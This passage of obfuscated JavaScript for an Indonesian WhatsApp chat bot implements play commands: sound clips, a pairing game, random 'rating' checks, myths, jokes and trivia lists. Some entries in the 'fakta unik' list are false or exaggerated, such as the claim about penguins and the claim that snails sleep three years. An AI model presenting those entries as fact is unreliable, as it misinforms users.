      case 'sound119':
      case "sound120":
      case 'sound121':
      case 'sound122':
      case "sound123":
      case "sound124":
      case "sound125":
      case "sound126":
      case "sound127":
      case 'sound128':
      case "sound129":
      case "sound130":
      case 'sound131':
      case "sound132":
      case "sound133":
      case 'sound134':
      case "sound135":
      case "sound136":
      case 'sound137':
      case 'sound138':
      case "sound139":
      case "sound140":
      case "sound141":
      case 'sound142':
      case "sound143":
      case "sound144":
      case "sound145":
      case 'sound146':
      case "sound147":
      case "sound148":
      case "sound149":
      case "sound150":
      case "sound151":
      case "sound152":
      case 'sound153':
      case 'sound154':
      case "sound155":
      case 'sound156':
      case "sound157":
      case "sound158":
      case "sound159":
      case "sound160":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x20bec3 = await getBuffer('https://github.com/RyzenOfc/Tiktokmusic-API/raw/master/tiktokmusic/' + _0x4ac520 + '.mp3');
          await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'audio': _0x20bec3,
            'mimetype': 'audio/mp4',
            'ptt': true
          }, {
            'quoted': _0x3f87c6
          });
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "jadian":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          _0x59f5fa.jadian = _0x59f5fa.jadian ? _0x59f5fa.jadian : {};
          let _0x45c6c8 = _0x3f87c6.mentionedJid[0x0] || (_0x3f87c6.quoted ? _0x3f87c6.quoted.sender : '');
          if (!_0x45c6c8) {
            return _0x3a091f("Kak, tag atau reply seseorang dulu dong biar KoKoRey tahu siapa yang Kamu maksud! 😉\n\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " @0");
          }
          if (_0x45c6c8 === _0x3f87c6.sender) {
            return _0x3a091f("Hmm... masa Kamu mau jadian sama diri sendiri? 😏 Cari pasangan yang bener ya, Kak!");
          }
          if (_0x45c6c8 === _0xb3f81d) {
            return _0x3a091f("Eh, Kak, aku ini cuma bot... Aku nggak bisa jadian sama Kamu 😣 Cari manusia dong!");
          }
          let _0x25408e = db.data.users[_0x45c6c8].pacar;
          let _0x5a12a6 = db.data.users[_0x3f87c6.sender].pacar;
          if (_0x5a12a6 === _0x45c6c8) {
            _0x3a091f("Lah, Kak, Kamu udah jadian sama dia kok masih ngajak lagi? 🙄 Setia dong!");
          } else {
            if (_0x25408e) {
              _0x3a091f("Duh, Kak... dia udah ada yang punya nih 🥲\nCoba tanya dulu ke @" + _0x25408e.split('@')[0x0] + ", siapa tahu boleh! 🫣");
            } else {
              if (_0x5a12a6) {
                _0x3a091f("Wah, ketahuan mau selingkuh ya, Kak?! 😱\n@" + _0x5a12a6.split('@')[0x0] + ", liat nih kelakuan ayangmu 🤭");
              } else {
                let _0x3d2660 = ["Ada saat di mana aku nggak suka sendiri. Tapi aku juga nggak mau semua orang menemani, hanya Kamu yang kumau.", "Aku baru sadar ternyata selama ini Kamu kaya! Kaya yang aku cari selama ini. Kamu mau nggak jadi pacarku?", "Aku boleh kirim CV ke Kamu nggak? Soalnya aku mau ngelamar jadi pacar.", "Kalau Kamu bunga, aku mau jadi lebahnya. Selalu datang dan nggak mau jauh-jauh dari Kamu. Mau jadi pacarku?", "Sederhana aja... Aku suka Kamu. Kamu suka aku nggak? 😳"];
                let _0x5cbfc5 = await _0x3d2660[Math.floor(Math.random() * _0x3d2660.length)];
                let _0x2e27f2 = "💌 *Love Message...* 💌\n\n@" + _0x3f87c6.sender.split('@')[0x0] + " ❤️ @" + _0x45c6c8.split('@')[0x0] + "\n\n\"" + _0x5cbfc5 + "\"";
                _0x59f5fa.jadian[_0x45c6c8] = [_0x3f87c6.reply({
                  'text': _0x2e27f2,
                  'footer': botName,
                  'buttons': [{
                    'buttonId': ".terima",
                    'buttonText': {
                      'displayText': "Terima ❤️"
                    }
                  }, {
                    'buttonId': ".tolak",
                    'buttonText': {
                      'displayText': "Tolak ❌"
                    }
                  }],
                  'viewOnce': true
                }), _0x3f87c6.sender];
                _0x3a091f("Yeyy, @" + _0x3f87c6.sender.split('@')[0x0] + " baru aja ngajak @" + _0x45c6c8.split('@')[0x0] + " buat jadian nih! 🥰\n\n@" + _0x45c6c8.split('@')[0x0] + ", silakan pilih ya~ ❤️");
              }
            }
          }
        }
        break;
      case 'terima':
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (_0x59f5fa.jadian[_0x3f87c6.sender]) {
            let _0x5f4e4f = _0x59f5fa.jadian[_0x3f87c6.sender][0x1];
            db.data.users[_0x5f4e4f].pacar = _0x3f87c6.sender;
            db.data.users[_0x3f87c6.sender].pacar = _0x5f4e4f;
            _0x3a091f("🎉🎉 Selamat!!! 🎉🎉\n\n@" + _0x3f87c6.sender.split('@')[0x0] + " sekarang resmi jadian sama\n❤️ @" + _0x5f4e4f.split('@')[0x0] + "!\n\nDuh, KoKoRey ikut seneng nih! Semoga langgeng yaa~ Jangan lupa undang KoKoRey kalau nanti nikah! 🙈💕");
            delete _0x59f5fa.jadian[_0x3f87c6.sender];
          } else {
            _0x3a091f("Eh kak, nggak ada yang nembak Kamu, kok mau terima siapa? 😅");
          }
        }
        break;
      case "tolak":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (_0x59f5fa.jadian[_0x3f87c6.sender]) {
            let _0x514c64 = _0x59f5fa.jadian[_0x3f87c6.sender][0x1];
            _0x3a091f("Aduhh, kasian banget @" + _0x514c64.split('@')[0x0] + " ditolak sama Kamu 😓\n\nTapi jangan sedih ya, Kak! Siapa tahu besok ada yang lebih baik dan lebih cocok buat Kamu! ❤️");
            delete _0x59f5fa.jadian[_0x3f87c6.sender];
          } else {
            _0x3a091f("Eh kak, nggak ada yang nembak Kamu kok. Jangan halu ya 🤭");
          }
        }
        break;
      case 'putus':
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          let _0x138a0a = db.data.users[_0x3f87c6.sender].pacar;
          if (_0x138a0a) {
            db.data.users[_0x3f87c6.sender].pacar = '';
            db.data.users[_0x138a0a].pacar = '';
            _0x3a091f("💔 *BREAKING NEWS* 💔\n\n@" + _0x3f87c6.sender.split('@')[0x0] + " dan @" + _0x138a0a.split('@')[0x0] + " resmi putus... 😢\n\nJangan sedih ya! Kadang putus itu bukan akhir dari segalanya, tapi awal dari sesuatu yang lebih baik. Tetap semangat! 💪");
          } else {
            _0x3a091f("Kak, Kamu tuh jomblo... Mau putus sama siapa? 🤨 Ada-ada aja deh!");
          }
        }
        break;
      case "cekpacar":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          try {
            let _0x42b9cc = _0x3f87c6.mentionedJid[0x0] || (_0x3f87c6.quoted ? _0x3f87c6.quoted.sender : '');
            if (!_0x42b9cc) {
              return _0x3a091f("Tag atau reply orang dulu dong, kak! 😅\n\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " @0");
            }
            let _0x53845a = db.data.users[_0x42b9cc].pacar;
            if (_0x53845a) {
              _0x3a091f("💑 *Love Status Update* 💑\n\n@" + _0x42b9cc.split('@')[0x0] + " sudah punya pacar!\n❤️ Pasangannya adalah @" + _0x53845a.split('@')[0x0] + " 😍\n\nCieee yang lagi bucin~ 🥰");
            } else {
              _0x3a091f("😱 *Breaking News!* 😱\n\nEhh, ternyata @" + _0x42b9cc.split('@')[0x0] + " masih jomblo! 🤭\n\nSiapa yang mau daftar jadi pacarnya nih? 🎤");
            }
          } catch (_0x4d41ef) {
            _0x3a091f("Hmm... kayaknya @" + user.split('@')[0x0] + " nggak ada di database, deh 😥");
          }
        }
        break;
      case "checkme":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          let _0x1770d1 = '' + _0x3f87c6.sender;
          const _0x378d84 = ["Baik 🥰", "Jutek 😤", "Santai 😎", "Ramah 😊", "Lucu 🤭", "Nyebelin 😜", "Serius 🧐", "Keren 😌"];
          const _0xe3960c = ["Memasak 🍳", "Menari 💃", "Bermain 🎮", "Menggambar 🎨", "Membaca 📚", "Menonton Anime 📺", "Bernyanyi 🎤", "Berkebun 🌱"];
          const _0x57fd99 = Array.from({
            'length': 0x64
          }, (_0x50c766, _0x4e298b) => (_0x4e298b + 0x1).toString());
          const _0xa9657f = Array.from({
            'length': 0x64
          }, (_0xb44e34, _0x256e9b) => (_0x256e9b + 0x1).toString());
          const _0x541b57 = ["Iya 😍", "Enggak 😭", "Sangat Tampan 🤩", "Hmm... Biasa aja 😅"];
          const _0x82cea4 = ["Penyayang 💖", "Pemarah 😡", "Murah Hati 🤗", "Sabar 🧘", "Lucu 🤭", "Serius 🧐"];
          const _0x1d75b9 = Array.from({
            'length': 0x64
          }, (_0x5bb531, _0x59c0b5) => (_0x59c0b5 + 0x1).toString());
          const _0x4ecea5 = Array.from({
            'length': 0x64
          }, (_0x4d11a5, _0x26b36b) => (_0x26b36b + 0x1).toString());
          const _0x3219ff = Array.from({
            'length': 0x64
          }, (_0x59a1a6, _0x2104d1) => (_0x2104d1 + 0x1).toString());
          const _0x25a39a = Array.from({
            'length': 0x64
          }, (_0x5bc5a9, _0x4f0667) => (_0x4f0667 + 0x1).toString());
          const _0x292164 = Array.from({
            'length': 0x64
          }, (_0xc97ded, _0x45df9e) => (_0x45df9e + 0x1).toString());
          let _0x1fdd7f = _0x378d84[Math.floor(Math.random() * _0x378d84.length)];
          let _0x20ad77 = _0xe3960c[Math.floor(Math.random() * _0xe3960c.length)];
          let _0x3ffdf8 = _0x57fd99[Math.floor(Math.random() * _0x57fd99.length)];
          let _0x501886 = _0xa9657f[Math.floor(Math.random() * _0xa9657f.length)];
          let _0x4a0f5e = _0x541b57[Math.floor(Math.random() * _0x541b57.length)];
          let _0x2f9394 = _0x82cea4[Math.floor(Math.random() * _0x82cea4.length)];
          let _0x1425d6 = _0x1d75b9[Math.floor(Math.random() * _0x1d75b9.length)];
          let _0x303f0c = _0x4ecea5[Math.floor(Math.random() * _0x4ecea5.length)];
          let _0x10d04d = _0x3219ff[Math.floor(Math.random() * _0x3219ff.length)];
          let _0x3225ef = _0x25a39a[Math.floor(Math.random() * _0x25a39a.length)];
          let _0x24697e = _0x292164[Math.floor(Math.random() * _0x292164.length)];
          let _0x5294d7 = "*🎀━━━〔 𝗖𝗵𝗲𝗰𝗸 @" + _0x1770d1.split('@')[0x0] + " 〕━━━🎀*\n\n📝 *Nama*: " + _0xdd1e8d + "\n✨ *Karakteristik*: " + _0x1fdd7f + "\n🎯 *Hobi*: " + _0x20ad77 + "\n❤️ *Tingkat Bucin*: " + _0x3ffdf8 + "%\n🌟 *Tingkat Keren*: " + _0x501886 + "%\n😎 *Ketampanan*: " + _0x4a0f5e + "\n🧠 *Watak*: " + _0x2f9394 + "\n💎 *KoKoReyl Baik*: " + _0x1425d6 + "%\n🔥 *KoKoReyl Buruk*: " + _0x303f0c + "%\n📊 *Kepintaran*: " + _0x10d04d + "%\n🛡️ *Keberanian*: " + _0x3225ef + "%\n👻 *Ketakutan*: " + _0x24697e + "%\n\n*🍭━━━〔 𝗖𝗛𝗘𝗖𝗞 𝗣𝗥𝗢𝗣𝗘𝗥𝗧𝗜𝗘𝗦 〕━━━🍭*";
          try {
            ppuser = await _0x59f5fa.profilePictureUrl(_0x3f87c6.sender, "image");
          } catch (_0x5e8b09) {
            ppuser = imageUrl;
          }
          let _0x25aba8 = await getBuffer(ppuser);
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'image': _0x25aba8,
            'caption': _0x5294d7,
            'mentions': [_0x1770d1]
          }, {
            'quoted': _0x3f87c6
          });
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "mitos":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x1b06fb = ["🌕 *Mitos Bulan Purnama*: Banyak orang percaya bahwa bulan purnama bisa memengaruhi perilaku manusia, menyebabkan kegilaan, dan meningkatkan angka kejahatan.", "🪞 *Mitos Cermin Pecah*: Memecahkan cermin dipercaya membawa nasib buruk selama 7 tahun.", "👻 *Mitos Hantu di Pohon Beringin*: Pohon beringin sering dikaitkan dengan makhluk halus dan dipercaya sebagai tempat tinggal roh gentayangan.", "🐈‍⬛ *Mitos Kucing Hitam*: Melihat kucing hitam melintas di depanmu sering dianggap sebagai pertanda sial.", "💍 *Mitos Cincin di Jari Tengah*: Memakai cincin di jari tengah dipercaya dapat menarik energi positif dan keberuntungan.", "🧂 *Mitos Menumpahkan Garam*: Menumpahkan garam dipercaya membawa nasib buruk, kecuali jika dilemparkan ke bahu kiri.", "🔮 *Mitos Bola Kristal*: Bola kristal sering dikaitkan dengan kemampuan meramal masa depan.", "🎋 *Mitos Pohon Bamboo*: Pohon bamboo di halaman rumah dipercaya bisa mengundang energi positif dan membawa keberuntungan.", "🌠 *Mitos Bintang Jatuh*: Jika melihat bintang jatuh dan membuat permintaan, maka permintaan itu akan terkabul.", "🐦 *Mitos Burung Masuk Rumah*: Burung yang masuk ke dalam rumah sering dianggap sebagai pertanda akan ada tamu atau berita penting.", "🌧️ *Mitos Hujan di Hari Pernikahan*: Hujan di hari pernikahan sering dianggap sebagai pertanda keberuntungan dan kebahagiaan.", "🍃 *Mitos Daun Jatuh di Kepala*: Jika ada daun jatuh di kepala seseorang, dipercaya orang itu akan mendapat keberuntungan.", "🦉 *Mitos Burung Hantu*: Burung hantu sering dianggap sebagai simbol kematian atau pertanda buruk di beberapa budaya.", "🖤 *Mitos Warna Hitam*: Warna hitam sering dikaitkan dengan kesialan dan energi negatif.", "🌈 *Mitos Ujung Pelangi*: Konon, ada harta karun di ujung pelangi, tetapi tidak ada yang bisa mencapainya.", "🌺 *Mitos Bunga Tumbuh di Makam*: Bunga yang tumbuh subur di makam dipercaya sebagai tanda bahwa roh orang yang dimakamkan itu damai.", "🏰 *Mitos Kastil Berhantu*: Banyak kastil tua di Eropa dipercaya dihantui oleh roh para penghuni masa lalu.", "💤 *Mitos Mimpi Gigi Copot*: Mimpi gigi copot sering dianggap sebagai pertanda akan ada kematian di keluarga.", "🌜 *Mitos Menghitung Bintang*: Menghitung bintang di langit dipercaya bisa membuat seseorang tumbuh jerawat.", "🍀 *Mitos Daun Semanggi Berdaun Empat*: Menemukan daun semanggi berdaun empat dipercaya membawa keberuntungan.", "🔥 *Mitos Api Menyala Sendiri*: Api yang menyala tiba-tiba di malam hari sering dikaitkan dengan kehadiran roh halus.", "🎵 *Mitos Siulan di Malam Hari*: Bersiul di malam hari dipercaya dapat mengundang makhluk halus.", "🦎 *Mitos Cicak Jatuh di Kepala*: Jika cicak jatuh di kepala seseorang, dipercaya itu adalah pertanda buruk.", "🌺 *Mitos Bunga Sedap Malam*: Aroma bunga sedap malam sering dianggap sebagai tanda kehadiran makhluk halus.", "🪦 *Mitos Makam Baru*: Mengunjungi makam yang baru dibuat di malam hari dipercaya dapat membawa energi negatif.", "🧟 *Mitos Zombie di Haiti*: Dalam kepercayaan Voodoo Haiti, ada mitos tentang manusia yang dihidupkan kembali sebagai zombie oleh penyihir.", "🌟 *Mitos Cahaya Misterius di Malam Hari*: Cahaya aneh yang terlihat di malam hari sering dianggap sebagai roh yang sedang berkeliaran.", "🏞️ *Mitos Danau Berhantu*: Banyak danau di dunia yang dipercaya dihuni oleh roh penjaga atau makhluk mitos.", "🪶 *Mitos Bulu Putih*: Menemukan bulu putih dipercaya sebagai tanda bahwa malaikat sedang menjaga kita.", "🍃 *Mitos Angin Berhembus Kencang Tiba-Tiba*: Angin yang tiba-tiba berhembus kencang sering dianggap sebagai tanda kehadiran makhluk halus.", "🎭 *Mitos Topeng Berhantu*: Beberapa topeng tradisional dipercaya memiliki roh atau energi mistis yang kuat.", "🗿 *Mitos Patung Tua*: Patung tua sering dianggap memiliki roh atau kutukan di dalamnya.", "⚰️ *Mitos Peti Mati Bergerak*: Ada mitos di beberapa budaya bahwa peti mati bisa bergerak sendiri jika ada roh yang tidak tenang.", "🔔 *Mitos Lonceng Berbunyi Sendiri*: Jika lonceng berbunyi sendiri tanpa ada angin atau yang memukulnya, sering dianggap sebagai tanda roh yang ingin berkomunikasi."];
          const _0x3930ee = _0x1b06fb[Math.floor(Math.random() * _0x1b06fb.length)];
          _0x3a091f("🪄 *Mitos Menarik*\n\n" + _0x3930ee);
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "faktaunik":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x1538a3 = ["🧠 Otak manusia dapat menghasilkan listrik yang cukup untuk menyalakan lampu kecil!", "🐼 Panda bisa menghabiskan sekitar 12 jam sehari hanya untuk makan bambu.", "🌕 Di bulan, jejak kaki manusia bisa bertahan selama jutaan tahun karena tidak ada angin atau hujan.", "🦄 Jerapah tidur hanya sekitar 10-30 menit sehari dan sering tidur sambil berdiri!", "🎵 Musik dapat meningkatkan suasana hati dan membantu mengurangi stres.", "🐢 Penyu sudah ada sejak zaman dinosaurus, sekitar lebih dari 200 juta tahun yang lalu.", "🍫 Cokelat bisa memicu hormon endorfin yang membuat seseorang merasa bahagia.", "🚀 Di luar angkasa, air mata tidak bisa jatuh karena gravitasi yang rendah!", "🔮 Lebih dari 70% permukaan Bumi ditutupi oleh air.", "🐝 Lebah bisa mengenali wajah manusia layaknya manusia mengenali wajah satu sama lain.", "🐧 Penguin adalah satu-satunya burung yang bisa berenang tetapi tidak bisa terbang.", "🦷 Gigi adalah satu-satunya bagian tubuh manusia yang tidak bisa memperbaiki dirinya sendiri.", "🐌 Siput bisa tidur hingga 3 tahun lamanya!", "🔑 Sidik jari koala sangat mirip dengan sidik jari manusia.", "🌍 Bumi adalah satu-satunya planet yang tidak dinamai berdasarkan nama dewa atau dewi.", "🐟 Ikan mas memiliki ingatan yang lebih baik daripada yang orang pikirkan, mereka bisa mengingat sesuatu hingga beberapa bulan.", "🦇 Kelelawar adalah satu-satunya mamalia yang bisa terbang.", "🎤 Hati manusia berdetak sekitar 100.000 kali sehari.", "🌈 Tidak ada dua pelangi yang benar-benar sama, setiap orang melihat pelangi dengan sudut pandang berbeda.", "📱 Lebih banyak orang di dunia memiliki akses ke ponsel daripada toilet bersih.", "🌋 Di Islandia, ada lebih dari 100 gunung berapi aktif.", "💧 Air panas bisa membeku lebih cepat daripada air dingin dalam kondisi tertentu (Efek Mpemba).", "⚡ Petir lebih panas dari permukaan matahari.", "🦩 Flamingo mendapatkan warna pink dari makanan yang mereka makan, yaitu udang.", "🐇 Kelinci tidak bisa muntah.", "🧊 Antartika adalah gurun terbesar di dunia meskipun tertutup es.", "🐜 Semut tidak memiliki paru-paru, mereka bernapas melalui pori-pori kecil di tubuh mereka.", "🌟 Cahaya dari bintang yang kita lihat mungkin sudah tidak ada lagi karena bintang tersebut bisa saja sudah mati.", "🕷️ Laba-laba bisa menghasilkan sutra yang lebih kuat daripada baja dengan berat yang sama.", "🐨 Koala tidur hingga 20 jam sehari.", "🦁 Singa betina lebih sering berburu dibandingkan singa jantan.", "🐍 Ular bisa tidur dengan mata terbuka karena mereka tidak memiliki kelopak mata.", "🧠 Otak manusia terdiri dari sekitar 75% air.", "🐦 Burung kolibri adalah satu-satunya burung yang bisa terbang mundur.", "🎮 Bermain video game bisa meningkatkan koordinasi tangan dan mata.", "📖 Orang yang membaca buku secara rutin cenderung lebih empatik dan mudah memahami perasaan orang lain.", "🎭 Tertawa dapat meningkatkan sistem kekebalan tubuh.", "🌠 Rata-rata ada 44 petir yang menyambar permukaan bumi setiap detik.", "🦜 Burung beo bisa meniru suara manusia karena memiliki struktur otot vokal yang unik.", "🐴 Kuda bisa tidur sambil berdiri.", "🐶 Anjing bisa memahami lebih dari 150 kata manusia.", "🌬️ Angin terkuat yang pernah tercatat di Bumi memiliki kecepatan 372 km/jam.", "🍯 Madu adalah satu-satunya makanan yang tidak pernah basi.", "🦀 Kepiting bisa berjalan ke samping karena struktur tubuh dan kakinya.", "🌌 Ada lebih banyak bintang di alam semesta daripada butiran pasir di semua pantai di Bumi.", "🐉 Komodo adalah kadal terbesar di dunia.", "🏊‍♂️ Manusia bisa bertahan tanpa makanan selama berminggu-minggu, tetapi hanya beberapa hari tanpa air.", "🦎 Jika ekor cicak putus, ekornya akan tumbuh kembali.", "🚀 Sebagian besar debu di rumah berasal dari kulit mati manusia."];
          const _0x9b3ab9 = _0x1538a3[Math.floor(Math.random() * _0x1538a3.length)];
          _0x3a091f("🧠 *Fakta Unik*\n\n" + _0x9b3ab9);
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'faktakucing':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x36369e = ["🐾 Kucing bisa melompat hingga 6 kali panjang tubuhnya!", "🐾 Lidah kucing memiliki tekstur kasar untuk membersihkan bulu.", "🐾 Kucing menghabiskan sekitar 70% hidupnya untuk tidur.", "🐾 Telinga kucing bisa berputar hingga 180 derajat!", "🐾 Kucing punya lima jari di kaki depan, tetapi hanya empat jari di kaki belakang.", "🐾 Kucing bisa berlari hingga 48 km per jam! Cepet banget, ya! 😲", "🐾 Kucing bisa mendengar suara frekuensi tinggi yang tidak bisa didengar manusia.", "🐾 Kucing bisa berkomunikasi dengan manusia lewat suara dan gerakan tubuh.", "🐾 Kucing memiliki 32 otot di telinga mereka untuk mengatur posisi telinga.", "🐾 Kucing memiliki indera penciuman yang 14 kali lebih tajam daripada manusia!", "🐾 Kucing menggosokkan kepala mereka ke objek sebagai tanda perkenalan dan untuk menandai wilayahnya.", "🐾 Beberapa kucing bisa mengingat tempat-tempat tertentu meskipun sudah bertahun-tahun berlalu.", "🐾 Kucing bisa melihat dengan jelas dalam kondisi cahaya yang sangat rendah, hampir gelap total!", "🐾 Kucing domestik punya banyak jenis suara, antara lain meong, dengkuran, dan purring!", "🐾 Kucing suka menjilat tangan mereka setelah makan untuk membersihkan diri dan merasa lebih tenang.", "🐾 Kucing sering tidur dengan mata setengah terbuka, ini untuk tetap waspada dari ancaman.", "🐾 Kucing punya kemampuan luar biasa dalam merasakan getaran tanah, misalnya gempa bumi!", "🐾 Kucing memiliki 9 kehidupan yang legendaris (tapi hanya mitos, ya)!", "🐾 Kucing bisa merasakan perubahan cuaca, kadang mereka lebih sensitif daripada manusia.", "🐾 Kucing tidak bisa merasakan rasa manis, lho! Mereka hanya suka makanan berbasis protein."];
          const _0x190bf6 = _0x36369e[Math.floor(Math.random() * _0x36369e.length)];
          _0x3a091f(_0x190bf6);
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "joke":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x2bc917 = ["🤣 Kenapa kucing gak suka online? Karena takut kena mouse!", "🤣 Apa bahasa Jepangnya diskon? Murah-murashii!", "🤣 Kenapa sepeda gak bisa berdiri sendiri? Karena lelah!", "🤣 Kenapa ikan gak pernah ketabrak saat berenang? Karena selalu lihat ke kiri dan kanan!", "🤣 Hewan apa yang gak pernah salah? Kuda, karena selalu di jalur yang benar!", "🤣 Kenapa matematika bikin pusing? Karena kalau dihitung terus, gak ada habisnya!", "🤣 Apa bedanya jemuran sama orang ngambek? Kalau jemuran dijemur, kalau orang ngambek diem-diem aja!", "🤣 Kenapa pohon kelapa di depan rumah harus ditebang? Soalnya kalau dicabut berat!", "🤣 Ayam apa yang bikin lelah? Ayam capek (cape)!", "🤣 Kalau ikan jadi presiden, siapa wakilnya? Ikan Hiu… Hiupresiden!", "🤣 Kenapa komputer suka kerja lembur? Soalnya takut di-*shutdown*!", "🤣 Apa bahasa Jepangnya air terjun? Byur-byur-yamashita!", "🤣 Kenapa guru selalu bawa buku? Karena kalau bawa genteng berat!", "🤣 Hewan apa yang paling kaya? Beruang... Karena punya *bear*-ang!", "🤣 Kenapa burung gagak gak pernah ke gym? Karena udah punya *sayap*!", "🤣 Kenapa tikus suka ke bioskop? Karena di sana banyak *trail*r (tikus rela)!", "🤣 Apa yang lebih kecil dari semut? Bayinya semut!", "🤣 Kenapa Superman gak pernah pake baju warna hijau? Karena warnanya udah dipake Hulk!", "🤣 Kenapa lampu merah suka bikin macet? Soalnya dia suka berhenti di tempat!", "🤣 Kenapa nasi goreng lebih populer daripada nasi putih? Karena nasi putih gak ada suaranya pas dimasak!"];
          const _0x4273e6 = _0x2bc917[Math.floor(Math.random() * _0x2bc917.length)];
          _0x3a091f(_0x4273e6);
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'suit':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x34ae2a = _0x2b2627.toLowerCase();
          const _0x95f5c0 = ["batu", "gunting", "kertas"];
          const _0x17be7d = _0x95f5c0[Math.floor(Math.random() * _0x95f5c0.length)];
          if (!_0x95f5c0.includes(_0x34ae2a)) {
            return _0x3a091f("🧠 Pilih antara *batu*, *gunting*, atau *kertas* ya, Kak!");
          }
          let _0x1cf411 = '';
          if (_0x34ae2a === _0x17be7d) {
            _0x1cf411 = "🤝 Seri! Kita sama-sama pilih *" + _0x17be7d + '*';
          } else if (_0x34ae2a === "batu" && _0x17be7d === "gunting" || _0x34ae2a === "gunting" && _0x17be7d === "kertas" || _0x34ae2a === "kertas" && _0x17be7d === "batu") {
            _0x1cf411 = "🎉 Kamu menang! Aku pilih *" + _0x17be7d + '*';
          } else {
            _0x1cf411 = "😢 Aku menang! Aku pilih *" + _0x17be7d + '*';
          }
          _0x3a091f(_0x1cf411);
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'cekganteng':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x268ec6 = Math.floor(Math.random() * 0x64) + 0x1;
          const _0x3988cf = _0x268ec6 > 0x50 ? "🔥 Wah, Kamu ini benar-benar bikin meleleh!" : _0x268ec6 > 0x32 ? "😎 Lumayan ganteng sih, Kak!" : "😅 Hmm... yang penting percaya diri ya, Kak!";
          _0x3a091f("👑 *Cek Ganteng*\n\nKegantengan Kamu ada di angka *" + _0x268ec6 + "%*\n" + _0x3988cf);
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "cekcantik":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x5071bf = Math.floor(Math.random() * 0x64) + 0x1;
          const _0x3b3ccb = _0x5071bf > 0x50 ? "🔥 Wah, Kamu ini benar-benar bikin meleleh!" : _0x5071bf > 0x32 ? "😍 Lumayan cantik sih, Kak!" : "😅 Hmm... yang penting percaya diri ya, Kak!";
          _0x3a091f("👑 *Cek Cantik*\n\nKecantikan Kamu ada di angka *" + _0x5071bf + "%*\n" + _0x3b3ccb);
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'cekimut':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x1a75b6 = Math.floor(Math.random() * 0x64) + 0x1;
          const _0x43ded9 = _0x1a75b6 > 0x50 ? "🔥 Wah, Kamu ini benar-benar bikin meleleh!" : _0x1a75b6 > 0x32 ? "😋 Lumayan imut sih, Kak!" : "😅 Hmm... yang penting percaya diri ya, Kak!";
          _0x3a091f("👑 *Cek Imut*\n\nKeimutan Kamu ada di angka *" + _0x1a75b6 + "%*\n" + _0x43ded9);
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "cekjomok":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x41b229 = Math.floor(Math.random() * 0x64) + 0x1;
          const _0x457316 = _0x41b229 > 0x50 ? "🔥 Wah, Kamu ini benar-benar bikin meleleh!" : _0x41b229 > 0x32 ? "🤣 Lumayan jomok sih, Kak!" : "😅 Hmm... yang penting percaya diri ya, Kak!";
          _0x3a091f("👑 *Cek Jomok*\n\nKejomokan Kamu ada di angka *" + _0x41b229 + "%*\n" + _0x457316);
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'cekwaifu':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x5dba36) {
            return _0x3a091f("Kirim/Reply Gambar Waifu Kamu Dengan Caption *" + (_0x4773c6 + _0x4ac520) + '*');
          }
          if (!_0x3df746) {
            return _0x3a091f("Kirim/Reply Gambar Waifu Kamu Dengan Caption *" + (_0x4773c6 + _0x4ac520) + '*');
          }
          const _0x5069fc = Math.floor(Math.random() * 0x64) + 0x1;
          const _0x7fc649 = _0x5069fc > 0x50 ? "😍 Waifu terbaik sepanjang masa!" : _0x5069fc > 0x32 ? "😊 Lumayan jadi waifu idaman!" : "😬 Ehm, mungkin waifu-nya butuh upgrade dikit...";
          _0x3a091f("💖 *Cek Waifu*\n\nPersentase waifu Kamu adalah *" + _0x5069fc + "%*\n" + _0x7fc649);
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "cekhusbu":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x5dba36) {
